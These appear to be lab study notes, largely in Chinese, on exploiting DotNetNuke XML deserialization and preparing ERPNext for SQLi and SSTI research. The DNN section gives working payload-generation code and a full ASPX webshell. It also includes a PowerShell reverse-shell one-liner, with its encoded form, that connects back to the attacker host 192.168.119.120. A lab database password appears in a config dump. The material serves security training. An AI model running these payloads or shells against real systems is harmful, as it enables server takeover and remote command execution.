            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myODP;
            String payload = "; DNNPersonalization=" + XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\PullFileTest.txt");
            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }
    }
}
```    
> `String payload = "; DNNPersonalization=" + XmlUtils.SerializeDictionary(table, "profile");`: 
> 1. XmlUtils.SerializeDictionary(table, "profile")
> 讓 DNN 自己把 Hashtable 序列化成它想要的 XML 格式，且根節點必須是 profile
> 2. 前面加上 "; DNNPersonalization="
> 為了方便把結果直接當成 cookie 字串格式存起來，會得到`; DNNPersonalization=<xml payload>`

![image](https://hackmd.io/_uploads/HyHFmOA5bg.png)\
(_innerException > _message)\
![image](https://hackmd.io/_uploads/H1g3EuAqbg.png)
> serializer did not expect the FileSystemUtils class instance

XmlSerializer 在處理 ObjectDataProvider 時，不知道裡面包著一個 FileSystemUtils\
當傳入 `ObjectDataProvider` 時，做的其實是類似
```csharp
new XmlSerializer(typeof(ObjectDataProvider))
```
那麼這個 serializer 只知道現在要序列化的是 ObjectDataProvider，但 ObjectDataProvider.ObjectInstance 裡塞的是 `FileSystemUtils`

👉🏻 額外告訴 serializer：FileSystemUtils 也是合法型別
```csharp
new XmlSerializer(myODP.GetType(), new Type[] { typeof(FileSystemUtils) })
```
🥚 對於 payload 沒有幫助，漏洞目標 DNN 反序列化時，不會用自訂的 constructor
```csharp
new XmlSerializer(Type.GetType(typeName))
```
即使在 payload 生成階段勉強序列化成功，到了 DNN 目標仍然會在反序列化時遇到同樣的問題。payload 不只要能生成，還要能被目標程式以它自己的 deserializer 邏輯成功解析。

結論：**不能用 DNN 的 SerializeDictionary() 成功序列化 ObjectDataProvider + FileSystemUtils 這個組合**
    
>[!Note]
> - ObjectDataProvider gadget 本身很有用
> - FileSystemUtils.PullFile 這個 primitive 也很有價值
> - 但這兩者組合在 DNN 的 XmlSerializer 環境下，無法形成可用 payload

### Enter The Dragon (ExpandedWrapper Class)
透過 ExpandedWrapper 讓 XmlSerializer 知道所有型別（包含內層的 FileSystemUtils）

The [official documentation](https://learn.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2?view=netframework-4.7.2) for the ExpandedWrapper:\
"This class is used internally by the system to implement support for queries with eager loading of related entities. This API supports the product infrastructure and is not intended to be used directly from your code."

教材稱： Not helpful to our understanding 🤣

>[!Note]
> `ExpandedWrapper<FileSystemUtils, ObjectDataProvider>`:
> 參數 | 意義 |
>:------:|:---------------------:|
>TExpandedElement |    FileSystemUtils（被包的目標）   |
> TProjectedProperty0  |   ObjectDataProvider（gadget）
> 
>  這會讓 XmlSerializer 在 runtime 知道:
> - ExpandedWrapper
> - ObjectDataProvider
> - FileSystemUtils ✅

可以解決 `XmlSerializer(typeof(ObjectDataProvider))` 不知道 FileSystemUtils\
`XmlSerializer(typeof(ExpandedWrapper<...>))` 全部型別都在型別圖裡


"projections" 這個技術 = 把一個物件轉換成另一種 form 的物件，通常用於減少 DB interaction:\
Ex. 在 .NET / LINQ / Data Provider 世界中
```csharp
SELECT user.Name, user.Email
```
不是回傳完整 User object，而是回傳一個「新物件」
```csharp
new { Name = ..., Email = ... }
```

但系統需要能動態產生任意型別的物件，也就是  ExpandedWrapper 的功能：\
所以本質上，可以使用此類將來源物件（ObjectDataProvider）包裝成一個新的物件類型，並提供所需的屬性（ObjectDataProvider.MethodName 和 ObjectDataProvider.MethodParameters）。這組資訊會被指派給 ExpandedWrapper instance 的屬性，從而使 XmlSerializer 能夠對其進行序列化。同樣，這滿足了XmlSerializer 的限制，因為它無法序列化類別方法，而只能序列化公共屬性和欄位。

[環境範例]\
Serializing an ExpandedWrapper object:
```csharp=
using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using System.Collections;
using System.Data.Services.Internal;
using System.Windows.Data;

namespace ExpWrapSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            Serialize();
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            myExpWrap.ProjectedProperty0.MethodName = "PullFile";
            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;
            String payload = XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }
    }
}
```
在 L19 不再直接使用 ObjectDataProvider ，而是 instantiating 一個 `ExpandedWrapper<FileSystemUtils, ObjectDataProvider>`類型的物件。此外使用 generic ProjectedProperty 屬性來建立ObjectDataProvider instance。

編譯並執行這段程式碼後，可以發現執行過程中沒有產生任何異常，且 Web Sever 確實處理了對應的 HTTP 請求\
serialized object:
```object
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/myODPTest.txt</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```
最終目標是確保序列化物件能夠在 DNN Web 應用程式中正確反序列化

測試:
```csharp=
using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using DotNetNuke.Common;
using System.Collections;
using System.Data.Services.Internal;
using System.Windows.Data;

namespace ExpWrapSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            //Serialize();
            Deserialize();
        }

        public static void Deserialize()
        {
            string xmlSource = System.IO.File.ReadAllText("C:\\Users\\Public\\ExpWrap.txt");
            Globals.DeserializeHashTableXml(xmlSource);
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            myExpWrap.ProjectedProperty0.MethodName = "PullFile";
            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;
            String payload = XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }
    }
}
```
`string xmlSource = System.IO.File.ReadAllText("C:\\Users\\Public\\ExpWrap.txt"); Globals.DeserializeHashTableXml(xmlSource);`: \
L19 實作反序列化函數。讀取先前從檔案中建立的序列化 ExpandedWrapper，並使用 DNN 的原生函數啟動反序列化過程


如果在 dnSpy 下執行這個 compiled 後的應用程序，並在`ObjectDataProvider.InvokeMethodOnInstance` 中的 `InvokeMember` 函數呼叫處設定斷點，確實可以在 call stack 來驗證反序列化是否有順利進行\
![image](https://hackmd.io/_uploads/SJy6rvGoZg.png)

Exploit chain
```
HTTP Request
  ↓
DNNPersonalization cookie
  ↓
LoadProfile()
  ↓
DeserializeHashTableXml()
  ↓
XmlSerializer.Deserialize()
  ↓
ObjectDataProvider.MethodName setter
  ↓
PullFile()
  ↓
下載 shell 到 web root
  ↓
RCE
```

### Putting It All Together
建立完整的攻擊流程，並嘗試利用取得反向 shell:
```
┌──(chw💲CHW)-[~]
└─$ locate cmdasp.aspx
/usr/share/webshells/aspx/cmdasp.aspx

┌──(chw💲CHW)-[~]
└─$ cat /usr/share/webshells/aspx/cmdasp.aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->

┌──(chw💲CHW)-[~]
└─$ sudo cp /usr/share/webshells/aspx/cmdasp.aspx /var/www/html/

┌──(chw💲CHW)-[~]
└─$ sudo chmod 644 /var/www/html/cmdasp.aspx
```
再次序列化 ExpandedWrapper ，並確保修改 MethodName 使用的 URL 和檔案名稱
```
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```
>[!Note]
> The IIS website user account must have Read, Write, and Change Control of the root website directory and subdirectories ( this allows the application to create files/folders and update its config files)
    
![image](https://hackmd.io/_uploads/Hy-yjDzo-g.png)

成功瀏覽 Webshell\
![image](https://hackmd.io/_uploads/rJJbjPzj-g.png)
    
注入 reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('{Kali IP}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
```
為了避免 Web Shell cmd 出現的引用和編碼問題，做 Base64 encode\
因為 PowerShell 可執行檔接受 `--EncodedCommand`參數
```
┌──(chw💲CHW)-[~]
└─$ cat powershellcmd.txt 
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};

┌──(chw💲CHW)-[~]
└─$ iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO
AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoAC...
```
Web Shell command:
```powershell
powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIALgAyADMAOAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoA
```
(Kali)
```
┌──(chw💲CHW)-[~]
└─$ nc -lvp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [192.168.119.120] from WIN-2TU088Q2N5H.localdomain [192.168.121.120] 54654
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv>
```
    
# ERPNext Authentication Bypass and Server Side Template Injection

用於 ERPNext 的兩個漏洞，[ERPNext](https://en.wikipedia.org/wiki/ERPNext) 是基於 Frappe Web 框架建構的開源企業資源計畫 (ERP) 軟體。

透過 SQLi 漏洞繞過身份驗證並存取管理員控制台。取得控制台存取權限後，將詳細研究伺服器端 SSTI 漏洞。將利用 SSTI 漏洞實現 RCE。

##  Getting Started
### Configuring the SMTP Server
攻擊流程:
```
SQLi → Auth Bypass（透過 reset）→ 進 Admin → SSTI → RCE
```
環境透過 SMTP 控制 password reset 流程\
透過 SSH 登入 ERPNext 進行設定:\
![image](https://hackmd.io/_uploads/ryYSeyOsZx.png)

編輯 site_config.json，讓 ERPNext 指向 Kali
```
frappe@lab-awae-123-ubuntu1604-erpnext-246-070:~$ cat frappe-bench/sites/site1.local/site_config.json                                               
{
 "db_name": "_1bd3e0294da19198",
 "db_password": "32ldabYvxQanK4jj",
 "db_type": "mariadb",
 "mail_server": "{Kali IP}",
 "use_ssl": 0,
 "mail_port": 25,
 "auto_email_id": "admin@randomdomain.com"
 "limits": {
  "space_usage": {
   "backup_size": 1.0,
   "database_size": 26.39,
   "files_size": 2.0,
   "total": 29.39
  }
 }
}

```
使用 Python 的 aiosmtpd 監聽 SMTP 連線
![image](https://hackmd.io/_uploads/SkEbzkdjbl.png)
> 開一個 fake SMTP server

### Configuring Remote Debugging
開啟 VScode 安裝 Python extension\
![image](https://hackmd.io/_uploads/BkrgayOobx.png)

在目標機器安裝 debug server\
![image](https://hackmd.io/_uploads/rynR6y_obe.png)

註解掉 `/home/frappe/frappe-bench/Procfile` 路徑下的 Web 伺服器。在啟用 debugging 模式後，會手動啟動 Web 伺服器\
![image](https://hackmd.io/_uploads/ry3FAJus-e.png)

    
安裝 ptvsd 後，透過編輯 `/home/frappe/frappe-bench/apps/frappe/frappe/app.py` 需要 reconfigure the application\
bench 工具會執行 app.py: 在 application 啟動時就啟動 remote debugging port
```py
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger")
ptvsd.wait_for_attach()
```
> ptvsd 預設會在 5678 port 啟動 debugger

![image](https://hackmd.io/_uploads/Bk6k5Loj-g.png)

    
在啟動服務和 Web server 之前，須將應用程式的全部原始碼傳輸到 Kali 系統。這樣就可以在 Kali 上使用 VScode 遠端偵錯 ERPNext 應用程式
```
rsync -azP frappe@192.168.120.123:/home/frappe/frappe-bench ./ 
```
![image](https://hackmd.io/_uploads/B16_UedjWx.png)

完成後透過 VScode 開啟\
![image](https://hackmd.io/_uploads/r1AUseOsbg.png)


啟動 Frappe 和 ERPNext 的調試端口了\
執行 `bench start` 指令來啟動 Redis、Web 伺服器、socket.io 伺服器以及 Frappe 和 ERPNext 所需的所有其他相依性

![image](https://hackmd.io/_uploads/ryXutGuiWe.png)

開啟另一個 SSH 從 `/home/frappe/frappe-bench/sites` 目錄啟動 Web server。可以使用 bench 安裝的 python binary 來執行 bench helper\
![image](https://hackmd.io/_uploads/ryaokwssZx.png)

```
$ ../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --nothreading
Now ready for the IDE to connect to the debugger
```
bench helper 會在 8000 port 啟動 Frappe Web 伺服器
- 參數 `--noreload` 以停用 Web Server Gateway Interface (werkzeug) 的 auto-reloading
- `--nothreading` 停用 multithreading
    
以上設定後測試 Remote Debugging 功能是否成功：\
VSCode 預設不會 debug a Python project，因此開啟現有的 Python 專案 (使用上述修改的 `/home/frappe/frappe-bench/apps/frappe/frappe/app.py`)\
在 Debug panel 中點擊 create a launch.json\
![image](https://hackmd.io/_uploads/Hkvg5vosZl.png)

選擇 Remote Attach，輸入目標機器 IP
![image](https://hackmd.io/_uploads/rkq97Kss-e.png)\
![image](https://hackmd.io/_uploads/Hkf-PKssZg.png)
> VSCode → 連到遠端 Python process

讓 debugger 知道本機 code 與遠端 code 對應：
```json
{
    // Use IntelliSense to learn about possible attributes.
    // Hover to view descriptions of existing attributes.
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
    "version": "0.2.0",
    "configurations": [
        
        {
            "name": "Python Debugger: Remote Attach",
            "type": "debugpy",
            "request": "attach",
            "connect": {
                "host": "{Kali IP}",
                "port": 5678
            },
            "pathMappings": [
                {
                    "localRoot": "${workspaceFolder}",
                    "remoteRoot": "/home/frappe/frappe-bench/"
                }
            ]
        }
    ]
}
```

上述已開啟的 ptvsd 成功啟動
![image](https://hackmd.io/_uploads/BJbIvKjoZx.png)

將斷點設在 `apps/frappe/frappe/handler.py` 檔案中的 handle function，該函數負責處理來自瀏覽器的每個請求
![image](https://hackmd.io/_uploads/BkcJe5iobe.png)\
![image](https://hackmd.io/_uploads/SyK1-csjbx.png)

>[!Tip]
> Remote Debugging 可以看到 SSTI payload 在 Python runtime 裡是怎麼被執行的

### Configuring MariaDB Query Logging
配置 DB logging 記錄: MariaDB 是 MySQL 的一個開源分支。配置日誌記錄與在 MySQL 中設定 logging 完全相同。

>[!Tip]
> 直接看到 ERPNext 實際送進 DB 的 SQL，在 SQLi 分析階段非常關鍵

在 `/etc/mysql/my.cnf` 編輯 MariaDB 設定檔，取消以下註解
```
frappe@ubuntu:~$ sudo nano /etc/mysql/my.cnf

[mysqld]
...
general_log_file        = /var/log/mysql/mysql.log
general_log             = 1
```
![image](https://hackmd.io/_uploads/B17QE9isZg.png)

重啟服務：
```
sudo systemctl restart mysql
```
可在 `/var/log/mysql/mysql.log` 觀察  Web application 查詢資料庫的狀況：
```
frappe@lab-awae-123-ubuntu1604-erpnext-247-198:~$ sudo tail -f /var/log/mysql/mysql.log
sudo: unable to resolve host lab-awae-123-ubuntu1604-erpnext-247-198
/usr/sbin/mysqld, Version: 10.2.24-MariaDB-10.2.24+maria~xenial-log (mariadb.org binary distribution). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
...
   19 Init DB   _1bd3e0294da19198
   19 Query     select `value` from
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler'
   19 Quit
   20 Connect   _1bd3e0294da19198@localhost as anonymous on 
   20 Query     SET AUTOCOMMIT = 0
   20 Init DB   _1bd3e0294da19198
   20 Query     select `value` from
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler'
   20 Quit
   21 Connect   _1bd3e0294da19198@localhost as anonymous on 
   21 Query     SET AUTOCOMMIT = 0
   21 Init DB   _1bd3e0294da19198
   21 Query     select `value` from
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler'
   21 Quit
   22 Connect   _1bd3e0294da19198@localhost as anonymous on 
   22 Query     SET AUTOCOMMIT = 0
   22 Init DB   _1bd3e0294da19198
   22 Query     select `value` from
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler'
...
```

## Introduction to MVC, Metadata-Driven Architecture, and HTTP Routing
先熟悉 Model-View-Controller (MVC) 設計模式、 Metadata-driven 架構和 HTTP routing。這些概念將教我們如何讀取 Frappe 和 ERPNext code，並發現程式碼庫中的漏洞。

### Model-View-Controller Introduction
MVC design pattern 可以用 old Point-of-Sale (PoS) 介紹，收銀員使用輸入設備輸入購買資訊。 POS系統隨後處理訂單，計算稅款並儲存進資料庫中。該系統還可以列印發票作為輸出。從數學角度來看，這個輸 input-process-output 的流程稱為 function machine。\
![image](https://hackmd.io/_uploads/B1EgAal2bl.png)\
看似簡單，但開始添加不同的產品類型和稅收系統、數百家商店和數千名用戶後，應用程式就會變得很龐大，可能導致 "spaghetti code"

為避免 spaghetti code， [1979](https://www.youtube.com/watch?v=o_TH-Y78tt4&t=1667) 年設計出 Model-View-Controller (MVC):  "MVC was conceived as a general solution to the problem of users controlling a large and complex data set"\
MVC software design pattern 有助於組織專案程式碼，進而提高程式碼reusability。從安全角度來看，提高程式碼重用性的好處在於，程式碼只需安全編寫一次。例如，如果開發人員手動操作 SQL 資料庫，他們可能會無意中將 SQL 語句與 client-provided data 連接起來，導致 SQL injection。而在 MVC 架構中，資料只需從中心位置提取一次，即可在整個應用程式中重複使用。

MVC design pattern is separated into three components: the `Model`, the `View`, and the `Controller`.\
在 Web 中， Controller  處理從使用者接收的輸入。可以是 HTTP route 的形式（i.e /user/update），也可以是透過 parameter 的形式（i.e /me?action=update）。無論輸入方式為何，Controller 都會將使用者的輸入對應到執行的函數。 所有使用者輸入邏輯都由 controller 處理。\
MVC 架構中的 Model 將資料對應到特定 object，並定義處理資料所需的邏輯。\
View 是最終呈現給使用者的輸出。在 Web 應用程式中，可以是 HTML、XML 或其他 final representation，供使用者使用。 Web frameworks 通常會提供使用模板引擎將模型提供的資料渲染給使用者。
```
User → Controller → Model → View → User
```
![image](https://hackmd.io/_uploads/BygmPRlhZl.png)
1. The user interacts with a website's view and the interaction is sent as a request to the controller.
2. The controller parses the user's interaction and requests the data from the model.
3. The model provides the requested data.
4. The controller renders a view using the provided data and responds back to the user.

>[!Tip]
> DocType11 documentation:
> > DocType is the basic building block of an application and encompasses all the three elements i.e. model, view and controller. 

Frappe 不是純 MVC，而是 DocType + metadata 驅動 + 部分 MVC的混合架構
- DocType = MVC 三合一，一個 DocType 同時代表：
```
Model：DB table（資料結構）
View：Form（前端 UI）
Controller：Python class（邏輯）
```
- DocType 只是 building block
整個系統 ≠ MVC\
只有 DocType 層「像 MVC」
- 底層是 metadata-driven
- ORM 是 metadata 驅動的

### Metadata-driven Design Patterns
metadata-driven design pattern 創建了一個 abstraction layer，簡化了新應用程式的開發流程。這對於允許用戶自訂儲存資料的 generic database-driven applications（i.e ERP ）

>[!Note]
> [Salesforce](https://www.salesforce.com/) 大力倡導 metadata-driven design，允許多個客戶擁有其應用程式套件的定製版本。

在 metadata-driven pattern 下，應用程式會根據 metadata 產生管理資料所需的 components，包括對資料執行 Create、Read、Update和 Delete(CRUD) 操作所需的元件。

從 DocTypes 的使用可以看出 Frappe 遵循  [metadata-driven design pattern](https://discuss.frappe.io/t/which-design-pattern-is-followed-by-frappe-developers-building-the-framework/41662/3)。使用 DocTypes 可以幫助開發人員將單一功能齊全的應用程式或框架重用於多種 industries 和 business models。\
![image](https://hackmd.io/_uploads/S1ZG9xZhbe.png)
> Frappe 的 Kernel 會抓取並解析 DocTypes，在資料庫中建立 appropriate tables\
> 常見目標是允許使用者透過圖形使用者介面 (GUI) 建立元資料文件: 在 ERPNext 中，登入後在 search bar 中搜尋「DocType」即可看到。點擊 "DocType" List 即可顯示所有文件類型的清單\
![image](https://hackmd.io/_uploads/BJWK5e-nWg.png)\
![image](https://hackmd.io/_uploads/Bkbqoxb2-l.png)

在 source code `apps/erpnext/erpnext/stock/doctype/stock_entry_detail/stock_entry_detail.json` 中可以看到 DocType JSON\
![image](https://hackmd.io/_uploads/BytBuzZhbe.png)

Frappe 中的文件類型還附帶 .py 文件，包含支援其他功能的附加邏輯和路由。 `apps/erpnext/erpnext/accounts/doctype/bank_account/bank_account.py` 銀行帳戶文件類型，新增了三個函數：
- 建立銀行帳戶
- 取得政黨銀行帳戶
- 取得銀行帳戶詳情

![image](https://hackmd.io/_uploads/BJsoL8bhbx.png)

回顧上述，DocType 包含了 MVC 架構中的模型要素，它與資料庫中的 table 互相關聯。View 賦予了 DocType 編輯和顯示為表單的功能（包括在使用者介面中編輯 DocType 的功能）。最後，DocType 透過附帶的 .py 檔案來充當 Controller

>[!Note]
> DocType Python 檔案中每個 method 都包含字串`@frappe.whitelist()` 是 Frappe 用於將 HTTP 請求路由到對應函數的方法之一

### HTTP Routing in Frappe
Frappe 使用 whitelist 的 Python decorator 來公開 API endpoints: `apps/frappe/frappe/__init__.py`
```py=470
whitelisted = []
guest_methods = []
xss_safe_methods = []
def whitelist(allow_guest=False, xss_safe=False):
	"""
	Decorator for whitelisting a function and making it accessible via HTTP.
	Standard request will be `/api/method/[path.to.method]`

	:param allow_guest: Allow non logged-in user to access this method.

	Use as:

		@frappe.whitelist()
		def myfunc(param1, param2):
			pass
	"""
	def innerfn(fn):
		global whitelisted, guest_methods, xss_safe_methods
		whitelisted.append(fn)

		if allow_guest:
			guest_methods.append(fn)

			if xss_safe:
				xss_safe_methods.append(fn)

		return fn

	return innerfn
```
當函數有 `@frappe.whitelist()` decorator 時，whitelist function 會被執行，被呼叫的函數會被加到 whitelist function list（L488）、guest_methods（L490-491）或 xss_safe_methods （L493-494）。
在 handler `apps/frappe/frappe/handler.py` 會使用到：\
handle function 提取 cmd（L17），值取`frappe.local.form_dict.cmd` 變數。只要 cmd 不是 login（L20） 就會 pass 給  execute_cmd function
```py=15
def handle():
	"""handle request"""
	cmd = frappe.local.form_dict.cmd
	data = None

	if cmd!='login':
		data = execute_cmd(cmd)

	# data can be an empty string or list which are valid responses
	if data is not None:
		if isinstance(data, Response):
			# method returns a response object, pass it on
			return data

		# add the response to `message` label
		frappe.response['message'] = data

	return build_response("json")
```
`execute_cmd` 函數會尋找命令並傳回該方法（L42）。如果找到該 method 會使用白名單檢查是否在白名單中。若在白名單中則執行:
```py=34
def execute_cmd(cmd, from_async=False):
	"""execute a request as python module"""
	for hook in frappe.get_hooks("override_whitelisted_methods", {}).get(cmd, []):
		# override using the first hook
		cmd = hook
		break

	try:
		method = get_attr(cmd)
	except Exception as e:
		if frappe.local.conf.developer_mode:
			raise e
		else:
			frappe.respond_as_web_page(title='Invalid Method', html='Method not found',
			indicator_color='red', http_status_code=404)
		return

	if from_async:
		method = method.queue

	is_whitelisted(method)

	return frappe.call(method, **frappe.form_dict)
```
```py=59
def is_whitelisted(method):
	# check if whitelisted
	if frappe.session['user'] == 'Guest':
		if (method not in frappe.guest_methods):
			frappe.msgprint(_("Not permitted"))
			raise frappe.PermissionError('Not Allowed, {0}'.format(method))

		if method not in frappe.xss_safe_methods:
			# strictly sanitize form_dict
			# escapes html characters like <> except for predefined tags like a, b, ul etc.
			for key, value in frappe.form_dict.items():
				if isinstance(value, string_types):
					frappe.form_dict[key] = frappe.utils.sanitize_html(value)

	else:
		if not method in frappe.whitelisted:
			frappe.msgprint(_("Not permitted"))
			raise frappe.PermissionError('Not Allowed, {0}'.format(method))
```
`is_whitelisted` method 只會簡單檢查正在執行的函數是否在白名單函數中\
⚠️ 也代表某個 Frappe function 使用了`@frappe.whitelist()` decorator，client 端就可以直接呼叫該函數。且如果 decorator 還傳入了 `allow_guest=True`，則 user 無需驗證即可運行函數

```
HTTP request
   ↓
handle()
   ↓
cmd = user input
   ↓
execute_cmd(cmd)
   ↓
get_attr(cmd) → 找 function
   ↓
is_whitelisted(method)
   ↓
frappe.call(method, **params)
```
    
在瀏覽根目錄會執行 Python function
![image](https://hackmd.io/_uploads/H1dwNSmnbg.png)
> `frappe.website.doctype.website_settings.website_settings.is_chat_enabled`

透過已知 query 尋找 `is_chat_enabled` function:\
![image](https://hackmd.io/_uploads/HkzFQLQ3We.png)
> `apps/frappe/frappe/website/doctype/website_settings/website_settings.py`\
> 且 `is_chat_enabled`function 包含 `@frappe.whitelist(allow_guest=True)` 允許未經驗證的使用者執行命令

🧠：可利用的身份驗證漏洞

## Authentication Bypass Discovery
如何系統化找到 auth bypass 的漏洞\
Methodology 👉🏻 找破壞 MVC / metadata pattern 的地方

